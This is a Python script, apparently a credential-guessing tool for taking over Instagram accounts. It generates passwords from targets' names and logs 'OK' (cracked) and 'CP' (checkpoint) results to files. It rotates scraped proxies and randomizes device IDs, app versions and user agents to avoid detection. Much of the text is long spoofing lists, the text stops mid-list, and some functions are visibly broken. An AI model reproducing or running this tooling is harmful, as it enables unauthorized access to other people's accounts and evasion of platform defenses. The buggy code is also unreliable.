#!/usr/bin/python3
#by gan 
BLUE = "\033[0;34m"
END  = "\033[0m"
RED  = "\033[0;31m"
CYAN = "\033[0;36m"

GREEN       = "\033[0;32m"
LIGHT_CYAN  = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"
#gannn
import re, requests, json, random, time, urllib, uuid, hashlib, os, sys, base64, fake_useragent
from rich.tree import Tree
from rich import print as printf
from rich import print as prints
from rich.table import Table
from rich.panel import Panel
from rich.console import Console
from rich.panel import Panel as Pan
from rich.panel import Panel as panel
from rich import print as cetak
from datetime import datetime
from bs4 import BeautifulSoup as bsp
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor as executor

from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

sys.stdout.write('\x1b]2; GAN Tools | VAKUM \x07')

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

console = Console()
session = requests.Session()
class Require:
    def __init__(self):
        self.info,self.ex = {}, {}

    def data_graph(self, xxx):
        data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
        }
        return(data)

    def headers_graph(self, xxx):
        headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
        }
        return(headers)

    def ClientId(self, xxx):
        try:
            Client = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
            return(Client)
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

    def AccountId(self, xxx):
        try:
            Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
            return(Userid)
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

    def GetRespon(self, url, cok):
        try:
            req = requests.get(url, cookies = {'cookie': cok}).text
            return(Client)
        except requests.exceptions.ConnectionError: time.sleep(5); self.GetRespon(url, cok)

    def Password(self, fullname):
        self.one = []
        self.two = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) < 3:
                pass
            if len(nama) == 3 and len(nama) == 4 or len(nama) == 5:
                self.one.append(nama + '123')
                self.one.append(nama + '1234')
                self.one.append(nama + '12345')
                self.one.append(nama + '01')
                self.one.append(nama + '02')
                self.one.append(nama + '321')                
                self.one.append(nama + '09')
                self.one.append(nama + '10')
                self.one.append(nama.capitalize() + '123')
                self.one.append(nama.capitalize() + '1234')
                self.one.append(nama.capitalize() + '12345')
            self.one.append(nama)
            self.one.append(fullname)
            self.one.append(nama + '123')
            self.one.append(nama + '1234')
            self.one.append(nama + '12345')
            self.one.append(nama + '01')
            self.one.append(nama + '02')
            self.one.append(nama + '321')            
            self.one.append(nama + '09')
            self.one.append(nama + '10')
            self.one.append(nama.capitalize() + '123')
            self.one.append(nama.capitalize() + '1234')
            self.one.append(nama.capitalize() + '12345')
            return self.one



    def Signature(self, data, body='SIGNATURE'):
        return 'signed_body={}.{}&ig_sig_key_version=4'.format(body, urllib.parse.quote_plus(data))

    def DeviceId(self):
        return 'android-%s'%(self.uuid_(True)[:16])

    def uuid_(self, abcd=None, zd=None):
        if zd is not None:
           m = hashlib.md5()
           m.update(zd.encode('utf-8'))
           i = uuid.UUID(m.hexdigest())
        else:
           i = uuid.uuid4()
           if abcd: return str(i.hex)
        return str(i)

    def adid(self, username):
        sha2 = hashlib.sha256()
        sha2.update(username.encode('utf-8'))
        abcd = sha2.hexdigest()
        return self.uuid_(False, abcd)

    def guid(self):
        return self.uuid_(False)

    def poid(self):
        return self.uuid_(False, self.guid())

    def socks(self, item = []):
        if os.path.isfile('data/termux/internal/proxies.txt') is True:
           return(open('data/termux/internal/proxies.txt','r').read().splitlines())
        else:
           try:
               resp = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all')
               for i in resp.text.splitlines():
                   if i.isdigit:
                      if i not in item:
                         item.append(i)
                         open('data/termux/internal/proxies.txt','a').write(f'{i}\n')
               return item
           except requests.exceptions.ConnectionError as e:
               time.sleep(5) ; self.socks()
               
    def vers(self):
        igv = ("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
        igve = igv.split(",")
        versi = random.choice(igve)
        return versi
        		
    def UserAgent(self):
        rr = random.randint
        rc = random.choice
        andro = rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
        dpis = rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
        pxl = rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
        basa = rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
        kode = rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
        igv = ("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.